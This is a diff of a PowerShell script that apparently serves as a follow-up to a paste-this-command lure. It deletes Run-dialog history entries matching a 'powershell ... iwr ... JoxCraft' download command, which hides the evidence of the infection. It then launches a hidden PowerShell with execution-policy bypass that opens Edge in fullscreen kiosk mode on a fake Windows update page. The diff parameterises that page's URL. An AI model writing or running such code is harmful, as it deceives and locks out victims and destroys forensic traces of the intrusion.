@@ -16,7 +16,7 @@ function Clear-RunHistory {
     if (Test-Path $runPath) {
         $mruList = (Get-ItemProperty -Path $runPath).MRUList
         $entries = Get-ItemProperty -Path $runPath
-                foreach ($key in $mruList.ToCharArray()) {
+        foreach ($key in $mruList.ToCharArray()) {
             $value = $entries.$key
             if ($value -match 'powershell.*iwr.*JoxCraft') {
                 Remove-ItemProperty -Path $runPath -Name $key -ErrorAction SilentlyContinue
@@ -32,7 +32,7 @@ Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList @(
     "-NoProfile",
     "-ExecutionPolicy", "Bypass",
     "-Command",
-    "Start-Sleep -Seconds 30; Start-Process 'msedge.exe' '--kiosk https://fakeupdate.net/win10ue --edge-kiosk-type=fullscreen --no-first-run'"
+    "Start-Sleep -Seconds 30; Start-Process 'msedge.exe' '--kiosk $kioskUrl --edge-kiosk-type=fullscreen --no-first-run'"
 )
 
 exit
